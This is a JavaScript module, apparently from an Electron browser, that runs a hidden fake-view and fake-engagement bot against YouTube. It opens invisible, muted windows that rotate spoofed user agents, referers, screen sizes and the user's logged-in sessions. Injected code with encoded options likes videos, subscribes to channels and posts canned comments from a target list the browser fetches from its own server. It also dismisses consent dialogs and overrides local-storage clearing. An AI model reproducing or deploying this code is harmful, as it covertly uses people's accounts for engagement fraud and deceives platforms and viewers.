(function (w) {
  if (w.MYSERVERYOUTUBESCRIPT_LOADED) {
    console.log('MYSERVERYOUTUBESCRIPT Aborting 0 ...');
    return;
  }

  w.MYSERVERYOUTUBESCRIPT_LOADED = true;
  w.MYSERVERYOUTUBESCRIPT = true;

  SOCIALBROWSER.var.blocking.youtube.quality = {
    name: 'medium',
    value: '360',
  };
  SOCIALBROWSER.youtubeManager = {
    currentIndex: -1,
    sleep: 1000 * 60 * 10,
    visitOptions: {
      subscribe: false,
      like: false,
      comment: false,
      unlike: false,
      report: false,
      show: false,
      type: '',
      timeout: 1000 * 60 * 5,
      title: 'No Title',
      url: 'https://bit.ly/3aBjyoX',
      host: 'youtube',
      referer: 'dynamic',
      proxy: null,
      partition: null,
      scroll: false,
      count: 1,
      ip: '127.0.0.1',
      group: 1000,
    },
    trackingList: [],
    visitList: [
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=0C76U8FK0Jw', timeout: 1000 * 60 * 15, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=QlaWLQRSIWA', timeout: 1000 * 60 * 15, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=cDad-ODVHpQ', timeout: 1000 * 60 * 15, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=dvY89VddNJg', timeout: 1000 * 60 * 15, group: 4 },

      { subscribe: true, like: true, title: 'scripts now - download', url: 'https://bit.ly/3qIL62c', timeout: 1000 * 60 * 2, group: 3 },
      { subscribe: true, like: true, title: 'fake views', url: 'https://bit.ly/3nxVWZ0', timeout: 1000 * 60 * 25, group: 1 },
      { subscribe: true, like: true, title: 'ازاى المواقع بتعرف انت مين', url: 'https://bit.ly/3aBjyoX', timeout: 1000 * 60 * 20, group: 1 },
      { subscribe: true, like: true, title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://bit.ly/3sqPXGv', timeout: 1000 * 60 * 20, group: 1 },
      { subscribe: true, like: true, title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://bit.ly/3nYMBqY', timeout: 1000 * 60 * 15, group: 1 },
      { subscribe: true, like: true, title: 'تحميل الافلام من المواقع بدون اعلانات', url: 'https://bit.ly/3FCa8Hr', timeout: 1000 * 60 * 3, group: 1 },
      { subscribe: true, like: true, title: 'Cima4u - YouTube', url: 'https://bit.ly/3x7NRyi', timeout: 1000 * 60 * 10, group: 1 },
      { subscribe: true, like: true, title: 'wintube com | sites scam on users', url: 'https://bit.ly/3oAQiDL', timeout: 1000 * 60 * 10, group: 1 },
      { subscribe: true, like: true, title: 'mvc api fetch', url: 'https://bit.ly/3HCCZw3', timeout: 1000 * 60 * 15, group: 1 },
      { subscribe: true, like: true, title: 'FrontEnd', url: 'https://bit.ly/3vwBBsv', timeout: 1000 * 60 * 35, group: 1 },
      { subscribe: true, like: true, title: 'nodejs chat', url: 'https://bit.ly/3w5T5JH', timeout: 1000 * 60 * 50, group: 1 },
      { subscribe: true, like: true, title: 'MVC 5 Review', url: 'https://bit.ly/3wmkQhd', timeout: 1000 * 60 * 75, group: 1 },
      { subscribe: true, like: true, title: 'c# Review', url: 'https://bit.ly/2SKI9CG', timeout: 1000 * 60 * 75, group: 1 },
      { subscribe: true, like: true, title: 'c# winforms Review', url: 'https://bit.ly/3qpT015', timeout: 1000 * 60 * 75, group: 1 },
      { subscribe: true, like: true, title: 'sharepoint admin 2016', url: 'https://bit.ly/34p86d9', timeout: 1000 * 60 * 65, group: 1 },

      { subscribe: true, like: true, title: 'برنامج نقاط البيع - السعر والمميزات', url: 'https://bit.ly/3senq6h', timeout: 1000 * 60 * 60, group: 2 },
      { subscribe: true, like: true, title: 'برنامج نقاط البيع - تركيب وتشغيل', url: 'https://bit.ly/2Nqnnpd', timeout: 1000 * 60 * 30, group: 2 },
      { subscribe: true, like: true, title: 'برنامج نقاط البيع - الاعدادات', url: 'https://bit.ly/3qEtQeL', timeout: 1000 * 60 * 60, group: 2 },
    ],
    refererList: [
      'https://www.facebook.com/',
      'https://quora.com/',
      'https://medium.com/',
      'https://twitter.com/',
      'https://web.whatsapp.com/',
      'https://www.instagram.com/',
      'https://www.pinterest.com/',
      'https://www.reddit.com/',
      'https://www.tumblr.com/',
      'https://www.tiktok.com/',
      'https://flipboard.com/',
      'https://vk.com/',
      'https://getpocket.com/',
      'https://digg.com/video',
      'https://www.linkedin.com/',
      'https://web.wechat.com/',
    ],
    userAgentList: [
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPod; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (X11; Linux i686; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/107.0 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 13_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/107.0 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:107.0) Gecko/107.0 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42' },
      { url: 'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 EdgA/107.0.1418.62' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/107.1418.62 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 Edge/40.15254.603' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/63.3.3216.58675' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/63.3.3216.58675' },
    ],
    scrrenSizeList: [
      '2560x1440	',
      '1920x1080',
      '1792x1120',
      '1680x1050',
      '1600x900',
      '1536x864',
      '1440x900',
      '1366x768',
      '1280x800',
      '1280x720',
      '1024x768',
      '1024x600',
      '962x601',
      '810x1080',
      '800x1280',
      '768x1024',
      '601x962',
      '600x1024',
      '414x896',
      '390x844',
      '360x800',
      '360x640',
    ],
    screenIndex: -1,
    randomScreenSize: function () {
      if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length > 0) {
        SOCIALBROWSER.youtubeManager.screenIndex++;
        if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length <= SOCIALBROWSER.youtubeManager.screenIndex) {
          SOCIALBROWSER.youtubeManager.screenIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.scrrenSizeList[SOCIALBROWSER.youtubeManager.screenIndex];
      } else {
        return '1366x768';
      }
    },
    agentIndex: -1,
    randomUserAgent: function () {
      if (SOCIALBROWSER.youtubeManager.userAgentList.length > 0) {
        SOCIALBROWSER.youtubeManager.agentIndex++;
        if (SOCIALBROWSER.youtubeManager.userAgentList.length <= SOCIALBROWSER.youtubeManager.agentIndex) {
          SOCIALBROWSER.youtubeManager.agentIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.userAgentList[SOCIALBROWSER.youtubeManager.agentIndex];
      } else {
        return null;
      }
    },
    refererIndex: -1,
    randomReferer: function (video) {
      if (video.type == 'support') {
        return 'https://egytag.com/';
      }
      if (SOCIALBROWSER.youtubeManager.refererList.length > 0) {
        SOCIALBROWSER.youtubeManager.refererIndex++;
        if (SOCIALBROWSER.youtubeManager.refererList.length <= SOCIALBROWSER.youtubeManager.refererIndex) {
          SOCIALBROWSER.youtubeManager.refererIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.refererList[SOCIALBROWSER.youtubeManager.refererIndex];
      } else {
        return 'https://www.facebook.com/';
      }
    },
    userIndex: -1,
    randomPartition: function () {
      if (SOCIALBROWSER.var.session_list.length > 0) {
        SOCIALBROWSER.youtubeManager.userIndex++;
        if (SOCIALBROWSER.var.session_list.length <= SOCIALBROWSER.youtubeManager.userIndex) {
          SOCIALBROWSER.youtubeManager.userIndex = 0;
        }
        return SOCIALBROWSER.var.session_list[SOCIALBROWSER.youtubeManager.userIndex].name;
      } else {
        return 'ghost_' + Date.now();
      }
    },
    randomVisit: function () {
      if (SOCIALBROWSER.youtubeManager.visitList.length > 0) {
        SOCIALBROWSER.youtubeManager.currentIndex++;
        if (SOCIALBROWSER.youtubeManager.visitList.length <= SOCIALBROWSER.youtubeManager.currentIndex) {
          SOCIALBROWSER.youtubeManager.currentIndex = -1;
          return null;
        }
        return SOCIALBROWSER.youtubeManager.visitList[SOCIALBROWSER.youtubeManager.currentIndex];
      } else {
        return null;
      }
    },
    prepareVisits: function () {
      SOCIALBROWSER.fetchJson(
        {
          url: SOCIALBROWSER.server_url + '/api/youtube_list',
          method: 'GET',
        },
        function (data) {
          if (data.done && data.list && data.list.length > 0) {
            if (data.reset) {
              SOCIALBROWSER.youtubeManager.trackingList = [];
            }
            SOCIALBROWSER.youtubeManager.visitList = [];
            data.list.forEach((v) => {
              SOCIALBROWSER.youtubeManager.visitList.push(v);
            });
          }
        }
      );
    },
  };

  SOCIALBROWSER.youtubeManager.openFakeViewWindow = function (op) {
    let options = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...op };
    let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

    let scrren_size = SOCIALBROWSER.youtubeManager.randomScreenSize().split('x');

    let win = new SOCIALBROWSER.remote.BrowserWindow({
      show: options.show,
      width: parseInt(scrren_size[0] || '1366'),
      height: parseInt(scrren_size[1] || '768'),
      skipTaskbar: true,
      webPreferences: {
        sandbox: false,
        contextIsolation: false,
        enableRemoteModule: true,
        nodeIntegrationInSubFrames: false,
        partition: options.partition || SOCIALBROWSER.youtubeManager.randomPartition(),
        webaudio: false,
        webSecurity: true,
        allowRunningInsecureContent: false,
        preload: preload,
      },
    });

    win.webContents.audioMuted = true;

    win.webContents.userAgent = options.userAgent || SOCIALBROWSER.youtubeManager.randomUserAgent().url;

    if (SOCIALBROWSER.var.core.id.like('*test*')) {
      win.setSkipTaskbar(false);
      win.showInactive();
      win.openDevTools();
      win.webContents.on('context-menu', (event, params) => {
        win.webContents.send('context-menu', params);
      });
    } else {
      if (options.show) {
        win.maximize();
      } else {
        win.hide();
      }
    }

    win.setMenuBarVisibility(false);
    if (options.proxy) {
      const ss = win.webContents.session;
      ss.setProxy(
        {
          proxyRules: options.proxy,
          proxyBypassRules: '127.0.0.1',
        },
        function () {}
      );
    }
    if (options.referer == 'dynamic') {
      options.referer = SOCIALBROWSER.youtubeManager.randomReferer(options);
    }
    let code_injected = `SOCIALBROWSER.fakeview123 = '${SOCIALBROWSER.to123(options)}';`;
    code_injected += `if (!window.SOCIALBROWSER) {
  window.SOCIALBROWSER = {
    var: {
      core: { id: '' },
      blocking: {
        javascript: {},
        popup: {},
        core: {},
        youtube: {},
      },
    },
    isIframe: () => {
      try {
        return window.self !== window.top;
      } catch (e) {
        return true;
      }
    },
  };
}
SOCIALBROWSER.url = SOCIALBROWSER.url || require('url');
SOCIALBROWSER.var.blocking.javascript.block_window_open = true;
SOCIALBROWSER.var.blocking.popup.allow_external = false;
SOCIALBROWSER.var.blocking.popup.allow_internal = false;
window.open = function (url) {
  console.log(' code0 [ window.open ] ' + url);
  if (!url || url == 'about:blank') {
    return;
  }
  setTimeout(function () {
    document.location.href = url;
  }, 3 * 1000);
};

localStorage.clear = () => {
  console.log('User Request Clear LocalStorage');
};

if (!SOCIALBROWSER.isIframe() && '${options.scroll}' == 'true') {
  function scrollRandom() {
    if (SOCIALBROWSER.scrollStop) {
      return;
    }

    let y = window.scrollY;
    y = y + (Math.floor(Math.random() * 150) + 50);
    if (document.body && window.innerHeight + window.scrollY >= document.body.offsetHeight) {
      y = 0;
      document.documentElement.scrollTop = 0;
    }
    window.scrollTo(0, y);

    setTimeout(() => {
      scrollRandom();
    }, 1000 * (Math.floor(Math.random() * 5) + 1));
  }

  setTimeout(() => {
    scrollRandom();
  }, 1000 * 20);
}

if (!SOCIALBROWSER.from123) {
  SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  SOCIALBROWSER.$base64Numbers = [];
  for (let $i = 11; $i < 99; $i++) {
    if ($i % 10 !== 0 && $i % 11 !== 0) {
      SOCIALBROWSER.$base64Numbers.push($i);
    }
  }

  SOCIALBROWSER.toJson = (obj) => {
    if (typeof obj === undefined || obj === null) {
      return '';
    }
    return JSON.stringify(obj);
  };

  SOCIALBROWSER.fromJson = (str) => {
    if (typeof str !== 'string') {
      return str;
    }
    return JSON.parse(str);
  };

  SOCIALBROWSER.toBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    if (typeof str !== 'string') {
      str = SOCIALBROWSER.toJson(str);
    }
    return btoa(unescape(encodeURIComponent(str)));
  };

  SOCIALBROWSER.fromBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    return decodeURIComponent(escape(atob(str)));
  };

  SOCIALBROWSER.to123 = (data) => {
    data = SOCIALBROWSER.toBase64(data);
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let letter = data[i];
      newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
    }
    return newData;
  };

  SOCIALBROWSER.from123 = (data) => {
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let num = data[i] + data[i + 1];
      let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
      newData += SOCIALBROWSER.$base64Letter[index];
      i++;
    }
    newData = SOCIALBROWSER.fromBase64(newData);
    return newData;
  };

  SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
    return Object.prototype.toString.call(elem).slice(8, -1);
  };
}

if (SOCIALBROWSER.fakeview123) {
  SOCIALBROWSER.fakeview = JSON.parse(SOCIALBROWSER.from123(SOCIALBROWSER.fakeview123));
}

if (!SOCIALBROWSER.fakeview) {
  SOCIALBROWSER.fakeview = {
    url: 'http://social-browser.com/api/youtube_random_video',
    referer: { url: 'https://www.olx.com.eg/' },
    like: true,
    subscribe: true,
  };
}
` + `console.log(' [ YOUTUBE ] ');

if (SOCIALBROWSER && SOCIALBROWSER.var) {
  SOCIALBROWSER.var.blocking.core = SOCIALBROWSER.var.blocking.core || {};
  SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
  SOCIALBROWSER.var.blocking.youtube = SOCIALBROWSER.var.blocking.youtube || {};
  SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
}

window.open = function () {
  return {};
};

function __document__ready__() {
  if (document.location.host.indexOf('youtu') == -1) {
    let body = document.querySelector('body');
    if (body && !document.querySelector('#__a_injected')) {
      let a = document.createElement('a');
      a.href = SOCIALBROWSER.fakeview.url;
      a.id = '__a_injected';
      a.innerHTML = SOCIALBROWSER.fakeview.url;
      a.setAttribute('target', '_self');

      body.appendChild(a);
      a.style.backgroundColor = 'red';
      a.style.color = '#ffffff';
      a.style.fontSize = '22px';
      a.scrollIntoView();

      setTimeout(function () {
        document.querySelector('#__a_injected').click();
      }, 5 * 1000);
    }

    setTimeout(function () {
      document.location.href = SOCIALBROWSER.fakeview.url;
    }, 30 * 1000);
  } else {
    SOCIALBROWSER.YOUTUBE = {
      PLAYER: '#movie_player',
      SUBSCRIBE_BUTTON: '#subscribe-button > ytd-subscribe-button-renderer > tp-yt-paper-button',
      LIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(1)',
      DISLIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(2)',
      NOTIFICATION: 'ytd-popup-container',
      LIKE_BUTTON_CLICKED_CLASS: 'style-default-active',
      COMMENT_BOX: 'ytd-comment-simplebox-renderer #simplebox-placeholder',
      COMMENT_SUBMIT: '#buttons #submit-button',
      isUserLogin: function () {
        return document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
      },
      scrollDown: function () {
        let y = window.scrollY + 50;
        window.scrollTo(0, y);
      },
      scrollUp: function () {
        let y = window.scrollY - 50;
        window.scrollTo(0, y);
      },
      comment: function () {
        if ((box = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_BOX))) {
          box.scrollIntoView(false);
          box.click();
          let old_copy = SOCIALBROWSER.remote.clipboard.readText();
          SOCIALBROWSER.remote.clipboard.writeText('Good Videos');
          SOCIALBROWSER.webContents.paste();
          setTimeout(() => {
            if ((submit = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_SUBMIT))) {
              submit.scrollIntoView(false);
              submit.click();
            }
            SOCIALBROWSER.remote.clipboard.writeText(old_copy);
          }, 1000 * 5);
        } else {
          SOCIALBROWSER.YOUTUBE.scrollDown();
          setTimeout(() => {
            SOCIALBROWSER.YOUTUBE.comment();
          }, 1000);
        }
      },
      isSubscribed: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        const subscribed = subscribeButton.hasAttribute('subscribed');
        return subscribed;
      },
      subscribe: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        let subscribed = subscribeButton.hasAttribute('subscribed');
        if (subscribed) {
          return true;
        } else {
          subscribeButton.click();
          return true;
        }
      },
      like: function () {
        const likeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON);
        if (!likeButton) {
          return false;
        }
        if (likeButton.classList.contains(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON_CLICKED_CLASS)) {
          return true;
        } else {
          likeButton.click();
          return true;
        }
      },
    };

    SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
    SOCIALBROWSER.var.blocking.youtube.skip_ads = false;

    setInterval(() => {
      if (SOCIALBROWSER.YOUTUBE.isUserLogin()) {
        if (SOCIALBROWSER.fakeview.like) {
          SOCIALBROWSER.YOUTUBE.like();
        }
        if (SOCIALBROWSER.fakeview.subscribe) {
          SOCIALBROWSER.YOUTUBE.subscribe();
        }
      }
    }, 1000 * 60 * 3);

    setInterval(() => {
      if (SOCIALBROWSER.video_player) {
        SOCIALBROWSER.video_player.playVideo();
      }

      document.querySelectorAll('ytd-consent-bump-v2-lightbox a.yt-simple-endpoint.style-scope.yt-button-renderer').forEach((d, i) => {
        if (i == 0) {
          d.click();
        }
      });

      document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
      document.querySelectorAll('#dialog').forEach((d) => d.remove());

      if (document.location.href.indexOf('consent') !== -1) {
        let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
        if (btn) {
          btn.click();
        }
      }
    }, 1000 * 5);

    if (SOCIALBROWSER && SOCIALBROWSER.setPlaybackQuality) {
      SOCIALBROWSER.var.blocking.youtube.quality = {
        name: 'medium',
        value: '360',
      };
      SOCIALBROWSER.setPlaybackQuality();
    }
  }
}

if (document.readyState !== 'loading') {
  __document__ready__();
} else {
  document.addEventListener('DOMContentLoaded', () => {
    __document__ready__();
  });
}
`;

    if (SOCIALBROWSER.var.core.version < '2021.03.01') {
      win.webContents.addListener('dom-ready', function (event) {
        win.webContents.executeJavaScript(code_injected);
      });
    } else {
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'youtube-view',
        options: options,
      });
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'eval',
        code: code_injected,
      });
    }

    win.loadURL(options.referer).catch((err) => {
      if (err.code === 'ERR_ABORTED') {
      }
    });

    win.on('close', function () {
      win.destroy();
    });

    win.on('closed', function () {
     
    });

    win.webContents.on('did-fail-load', function (e) {
      if (e.isMainFrame) {
        win.destroy();
      }
    });

    win.webContents.session.on('will-download', (event, item, webContents) => {
      event.preventDefault();
    });
    win.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
      callback(false);
    });
    win.webContents.session.setPermissionCheckHandler((webContents, permission) => {
      return false;
    });

    if (win.webContents.setWindowOpenHandler) {
      win.webContents.setWindowOpenHandler(({ url, frameName }) => {
        console.log('youtube-manager.js : block setWindowOpenHandler');
        return { action: 'deny' };
      });

      win.webContents.on('did-create-window', (win, { url, frameName, options, disposition, referrer, postData }) => {});
    }
    win.webContents.on('new-window', function (event, url, frameName, disposition, options, referrer, postBody) {
      event.preventDefault();
      console.log('youtube-manager.js : block new-window ');
    });

    setTimeout(function () {
      if (win && !win.isDestroyed()) {
        win.destroy();
      }
    }, options.timeout);
  };
  SOCIALBROWSER.youtubeManager.Tracking = function (v) {
    let t = { group_count: 0 };
    v.guid = v.referer + '---' + v.url + '---' + v.ip + '---' + v.group;
    SOCIALBROWSER.youtubeManager.trackingList.forEach((track) => {
      if (track.guid == v.guid) {
        track.count++;
        t = { ...track, ...t };
      }
      if (track.group == v.group && track.ip == v.ip) {
        t.group_count++;
      }
    });
    if (!t.guid) {
      t = {
        guid: v.guid,
        count: 1,
        group_count: 1,
        group: v.group,
        ip: v.ip,
        ...t,
      };
      SOCIALBROWSER.youtubeManager.trackingList.push(t);
    }
    return t;
  };
  SOCIALBROWSER.youtubeManager.tryRunFakeView = function () {
    let v = SOCIALBROWSER.youtubeManager.randomVisit();
    if (v) {
      v = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...v };
      let track = SOCIALBROWSER.youtubeManager.Tracking(v);
      if ((v.count && v.count < track.count) || track.group_count > 10) {
        SOCIALBROWSER.youtubeManager.tryRunFakeView();
      } else {
        SOCIALBROWSER.youtubeManager.openFakeViewWindow(v);
        setTimeout(() => {
          SOCIALBROWSER.youtubeManager.tryRunFakeView();
        }, v.timeout + (1000 * 60));
      }
    } else {
      SOCIALBROWSER.youtubeManager.tryRunFakeView();
    }
  };

  SOCIALBROWSER.youtubeManager.startTime = Date.now();
  SOCIALBROWSER.youtubeManager.prepareVisits();
  setTimeout(() => {
    SOCIALBROWSER.youtubeManager.tryRunFakeView();
  }, 1000 * 60 * 5);
  setInterval(() => {
    SOCIALBROWSER.youtubeManager.prepareVisits();
    if (Date.now() - SOCIALBROWSER.youtubeManager.startTime > 1000 * 60 * 60 * 24) {
      SOCIALBROWSER.youtubeManager.trackingList = [];
      console.clear();
    }
  }, 1000 * 60 * 60);
})(window);
